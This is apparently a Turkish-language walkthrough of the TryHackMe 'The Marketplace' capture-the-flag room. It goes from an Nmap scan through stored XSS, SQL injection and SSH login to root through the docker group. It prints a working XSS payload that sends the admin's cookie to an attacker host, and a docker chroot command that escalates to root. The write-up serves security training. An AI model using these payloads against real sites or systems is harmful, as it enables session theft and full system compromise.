# The_marketplace-CTF
TRYHACKME "themarketplace" ctf çözümü

İlk olarak Nmap aracını kullanarak bir tarama işlemi gerçekleştiriyoruz.
![NmapScann](https://user-images.githubusercontent.com/103064152/219755795-092321da-348a-4223-982e-3dc5010b6585.png)

80 port'tun açık olduğunu görünce Web sitesine gidiyoruz.
![Web page](https://user-images.githubusercontent.com/103064152/219757122-f2356006-cbc4-47a4-b469-9ea12c46c7ec.png)

Sign Up 'dan kayıt oluyoruz.
![login](https://user-images.githubusercontent.com/103064152/219757306-5494984e-52b8-4bf3-b0a0-76bb448bc1e8.png)

New list giderek yeni bir liste oluşturuyoz.Burda olası "xss" açığını kontrol ediyoruz.
![xss tespiti](https://user-images.githubusercontent.com/103064152/219757679-46bbcc13-d7b1-42b5-9b74-50f6d937d45d.png)

![alert](https://user-images.githubusercontent.com/103064152/219757786-d4e477b0-e5fb-4bfe-92c1-dfd14dd9b859.png)

Xss açığını tespit ettikden sonra admin cokkie'si almak için bir javascript kodu injecte ediyoruz.

XSS Payload:<script>document.location='http://(Yourİp):8000/XSS/grabber.php?c='+document.cookie</script>

![Cokkie](https://user-images.githubusercontent.com/103064152/219758354-19dc0247-9f4d-4304-9926-17f2b2c66a13.png)

Daha sonra admin cokkiesini kendi cokkie ile değiştiriyoruz.Ve admin oluyoruz.

![Admin Panel](https://user-images.githubusercontent.com/103064152/219758676-8e9876f6-143c-4551-9c1e-6bbe24319757.png)

Url kısmında SQL injection olabileceğinden şüpelendim. 
![Sql injection tespiti](https://user-images.githubusercontent.com/103064152/219758988-504be2db-0249-4bfe-809f-e0a22c14d4bb.png)

Url kısmına bir SQL injection tespiti için birşeyler denedim ve sonuç olarak SQL injection açığı olduğunu tespit ettim.
Daha sonra database ismini öğrene bilmek için bir sql sorgusu yazdım ve sonuç olarak bunları aldım.
![Sql injection](https://user-images.githubusercontent.com/103064152/219759836-15f9428d-94c7-4ba8-8bdf-d77e20efdfa4.png)

Farklı SQL sorguları çalıştırarak. Database kayıtlı bir Mesaj buldum:
![Mesajj](https://user-images.githubusercontent.com/103064152/219760700-c2fa2cc8-680b-4541-b428-dad35a22d397.png)

Mesaj'dan aldığım password ve username ile ssh ile sisteme login oldum.
![SSH login](https://user-images.githubusercontent.com/103064152/219761161-4da37e7f-bc5e-4cec-b482-1e376833a7ad.png)

ls -la çalıştırdım user.txt okudum ve 2.flag almış oldum.

!YETKİ YÜKSELTME:
 klasik olarak direk sudo -l komutunu çalıştırdım.
 ![Sudo -l](https://user-images.githubusercontent.com/103064152/219761997-8f2fe23e-cc1c-4b36-be6a-34d72abf9f2b.png)
 
 /opt/backups dosyasına giderek  backups.sh diye bir dosyanın nasıl çalıştığını anladım. Daha sonra farklı komutlar kullanarak diğer kullanıcı olarak kendime bir shell code yazdım.
 
![Michangel olma](https://user-images.githubusercontent.com/103064152/219762835-a2880e9c-604b-44e0-87c4-d2f6633778d6.png)


![id](https://user-images.githubusercontent.com/103064152/219764431-0126c652-e7db-494c-bd2c-9be7c525582c.png)
Kullanıcının docker grupana dahil olduğunu gördüm
Daha sonra "docker image" komutunu çalıştırdım.

![docker image](https://user-images.githubusercontent.com/103064152/219765211-81de0623-ad77-4b37-a0c5-8b29b0cf94bc.png)

docker run -v /:/mnt --rm -it alpine chroot /mnt sh bu komutu kullanarak root oldum.
![root](https://user-images.githubusercontent.com/103064152/219765433-06572f4a-40ec-4265-80f9-def7dbf0c3ee.png)




